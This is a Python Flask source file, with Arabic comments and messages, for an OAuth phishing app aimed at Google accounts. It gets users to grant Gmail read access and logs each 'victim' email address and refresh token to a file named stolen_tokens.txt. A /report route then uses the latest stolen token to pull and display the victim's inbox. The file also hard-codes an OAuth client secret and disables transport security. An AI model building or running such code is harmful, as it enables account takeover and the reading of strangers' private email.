import os
import base64
import json
import traceback
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# =================================================================
# بيانات الاعتماد والمسارات
# =================================================================
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bashar-7fw9.onrender.com/callback'
TOKEN_STORAGE_FILE = '/home/Bmapps/mysite/stolen_tokens.txt'
DEBUG_LOG_FILE = '/home/Bmapps/mysite/report_debug.log'
# =================================================================

SCOPES = [
   'https://www.googleapis.com/auth/gmail.readonly',
    'openid'
]

# =================================================================
# الدوال المساعدة
# =================================================================
def log_error(e):
    with open(DEBUG_LOG_FILE, 'a') as f:
        f.write(f"--- ERROR ---\n{traceback.format_exc()}\n\n")

def get_latest_token_from_log():
    try:
        if not os.path.exists(TOKEN_STORAGE_FILE):
            return None
        with open(TOKEN_STORAGE_FILE, 'r') as f:
            content = f.read()
        if not content.strip():
            return None
        last_entry = content.strip().split('--- Victim Account ---')[-1]
        if 'Refresh Token:' in last_entry:
            token_line = [line for line in last_entry.split('\n') if 'Refresh Token:' in line][0]
            refresh_token = token_line.split('Refresh Token:')[1].strip()
            return refresh_token
    except Exception as e:
        log_error(e)
        return None
# =================================================================

def create_flow():
    return Flow.from_client_config(
        client_config={
            "web": {
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)
@app.route('/callback')
def callback():
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        
        if refresh_token:
            log_entry = f"--- Victim Account ---\nEmail: {user_email}\nRefresh Token: {refresh_token}\n---------------------\n\n"
            log_file_path = f'/home/Bmapps/mysite/stolen_tokens.txt'
            with open(log_file_path, 'a') as f:
                f.write(log_entry)
    except Exception as e:
        print(f"Error while logging token: {e}")

    session['credentials'] = { 
        'token': credentials.token, 
        'refresh_token': credentials.refresh_token, 
        'token_uri': credentials.token_uri, 
        'client_id': credentials.client_id, 
        'client_secret': credentials.client_secret, 
        'scopes': credentials.scopes 
    }
    
    return redirect('/#dashboard')
    
@app.route('/report')
def show_report():
    try:
        refresh_token = get_latest_token_from_log()
        if not refresh_token:
            return "<h2>لم يتم العثور على أي Refresh Token مسروق بعد.</h2>", 404

        credentials = Credentials(
            token=None, refresh_token=refresh_token,
            token_uri='https://oauth2.googleapis.com/token',
            client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
            scopes=['https://www.googleapis.com/auth/gmail.readonly']
        )
        
        service = build('gmail', 'v1', credentials=credentials)
        
        result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
        messages = result.get('messages', [])
        
        if not messages:
            return "<h2>لم يتم العثور على رسائل في البريد الوارد للضحية.</h2>"

        emails_data = []
        def callback(request_id, response, exception):
            if exception is None:
                emails_data.append(response)
            else:
                log_error(exception)
        
        batch_size = 100
        for i in range(0, len(messages), batch_size):
            batch = service.new_batch_http_request(callback=callback)
            message_slice = messages[i:i + batch_size]
            for msg in message_slice:
                batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
            batch.execute()

        html_content = """
        <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل (آخر 500 رسالة)</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
            h1, h2 { color: #343a40; text-align: center; margin-bottom: 30px;}
            .email { background-color: #ffffff; border: 1px solid #dee2e6; margin-bottom: 10px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); overflow: hidden; }
            .email-header { padding: 15px 20px; cursor: pointer; background-color: #f1f3f5; }
            .email-header:hover { background-color: #e9ecef; }
            .email-header h2 { font-size: 1.1rem; margin: 0; color: #0056b3; text-align: right; }
            .email-header small { font-size: 0.85rem; color: #6c757d; }
            .email-body { padding: 20px; border-top: 1px solid #dee2e6; display: none; word-wrap: break-word; }
            .email-body pre { white-space: pre-wrap; line-height: 1.7; margin-top: 0; font-family: inherit; }
            iframe { width: 100%; height: 600px; border: none; }
        </style>
        <script>
            function toggleMessage(id) {
                var element = document.getElementById('body-' + id);
                if (element.style.display === "none") { element.style.display = "block"; } else { element.style.display = "none"; }
            }
        </script>
        </head><body><h1>تقرير آخر 500 رسالة للضحية الأخيرة</h1>
        """

        for msg_data in emails_data:
            payload = msg_data.get('payload', {})
            headers = payload.get('headers', [])
            subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
            sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
            
            body = ""
            def find_body(parts):
                html_part = ""
                plain_part = ""
                for part in parts:
                    if part.get('mimeType') == 'text/html' and 'data' in part['body']:
                        html_part = base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                        return html_part
                    elif part.get('mimeType') == 'text/plain' and 'data' in part['body']:
                        plain_part = base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                return f"<pre>{plain_part}</pre>" if plain_part else ""

            if 'parts' in payload:
                body = find_body(payload['parts'])
            elif 'data' in payload.get('body', {}):
                 plain_body = base64.urlsafe_b64decode(payload['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                 body = f"<pre>{plain_body}</pre>"

            if not body:
                body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"

            html_content += f"""
            <div class="email">
                <div class="email-header" onclick="toggleMessage('{msg_data['id']}')">
                    <h2>{subject}</h2><small>من: {sender}</small>
                </div>
                <div class="email-body" id="body-{msg_data['id']}">{body}</div>
            </div>
            """
        
        html_content += "</body></html>"
        return Response(html_content, mimetype='text/html; charset=utf-8')

    except Exception as e:
        log_error(e)
        return "<h1>حدث خطأ فادح أثناء توليد التقرير.</h1><p>قد يكون الـ Refresh Token غير صالح أو تم إبطاله. راجع ملف الأخطاء.</p>", 500